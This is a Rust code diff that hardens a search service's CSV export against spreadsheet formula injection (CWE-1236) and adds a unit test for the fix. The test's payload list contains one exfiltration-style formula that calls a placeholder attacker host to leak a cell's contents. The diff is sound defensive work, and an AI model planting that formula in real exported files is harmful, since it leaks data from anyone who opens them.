@@ -192,8 +192,19 @@ pub fn csv_response(response: &SearchResponse) -> Response {
         .into_response()
 }
 
+/// Leading characters that make a spreadsheet read the cell as a formula.
+const FORMULA_PREFIXES: [char; 4] = ['=', '+', '-', '@'];
+
 fn csv_field(value: &str) -> String {
-    format!("\"{}\"", value.replace('"', "\"\""))
+    // Quoting keeps the CSV structure; it does not stop a spreadsheet from
+    // evaluating a cell that starts with a formula character (CWE-1236). The
+    // apostrophe makes the cell text without changing the visible value.
+    let neutralized = if value.starts_with(FORMULA_PREFIXES) || value.starts_with(['\t', '\r']) {
+        format!("'{value}")
+    } else {
+        value.to_string()
+    };
+    format!("\"{}\"", neutralized.replace('"', "\"\""))
 }
 
 /// `format=rss`: an RSS 2.0 feed with one item per result.
@@ -353,6 +364,26 @@ mod tests {
     #[test]
     fn csv_fields_are_quoted() {
         assert_eq!(csv_field("a \"b\" c"), "\"a \"\"b\"\" c\"");
+    }
+
+    #[test]
+    fn csv_fields_cannot_start_a_formula() {
+        // A spreadsheet evaluates a quoted cell that starts with one of these,
+        // so the value is neutralised instead of merely quoted (CWE-1236).
+        for payload in [
+            "=WEBSERVICE('http://attacker.example/?leak='&A1)",
+            "+1+1",
+            "-1+1",
+            "@SUM(A1)",
+            "\t=1+1",
+            "\r=1+1",
+        ] {
+            let field = csv_field(payload);
+            let expected = format!("\"'{}", payload.replace('"', "\"\"")) + "\"";
+            assert_eq!(field, expected, "{payload}");
+        }
+        // Ordinary text keeps its exact value.
+        assert_eq!(csv_field("plain title"), "\"plain title\"");
     }
 
     #[test]
